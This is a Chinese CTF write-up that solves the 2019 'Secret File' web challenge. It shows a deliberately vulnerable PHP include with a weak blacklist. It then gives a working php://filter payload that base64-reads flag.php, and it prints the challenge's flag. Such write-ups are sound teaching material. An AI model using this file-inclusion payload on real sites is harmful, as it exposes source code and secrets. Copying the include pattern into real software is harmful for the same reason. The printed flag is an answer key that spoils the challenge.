# [极客大挑战 2019]Secret File

查看源代码后发现 `<a id="master" href="./Archive_room.php" style="background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;">Oh! You found me</a>`  
尝试访问 `/Archive_room.php`，源码中 `<a id="master" href="./action.php" style="background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;">`，访问 `/action.php`，直接跳转到了 `/end.php`，抓包看看发送了什么。

```html
<html>
<!--
   secr3t.php        
-->
</html>
```

提示了路径，访问 `/secr3t.php`

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
```

考一个文件包含。

```txt
strstr
(PHP 4, PHP 5, PHP 7, PHP 8)

strstr — 查找字符串的首次出现

stristr
(PHP 4, PHP 5, PHP 7, PHP 8)

stristr — strstr() 函数的忽略大小写版本
```

过滤了 `../, tp, input`，没有过滤 `filter`  

## php://filter是什么

来自官方文档的解释：

>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
<https://www.php.net/manual/zh/wrappers.php.php>

简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。

协议参数
具体有以下几种参数：
|名称|描述|
|---|---|
|`resource=<要过滤的数据流>`|这个参数是必须的。它指定了你要筛选过滤的数据流。|
|`read=<读链的筛选列表>`|该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。|
|`write=<写链的筛选列表>`|该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。|
|`<；两个链的筛选列表>`|任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。|
例如

```php
php://filter/read=convert.base64-encode/resource=index.php
```

读取文件 `index.php`，并进行 base64 编码，防止文件被包含的时候被当做 php 代码执行  
因此本题 payload

```txt
/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

base64 解码得到的内容

```html
<!DOCTYPE html>

<html>

    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>

    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "我就在这里";
                $flag = 'flag{f1a3ba57-b997-43c6-b7b5-577c258974f1}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>

</html>


```

得到 flag `flag{f1a3ba57-b997-43c6-b7b5-577c258974f1}`
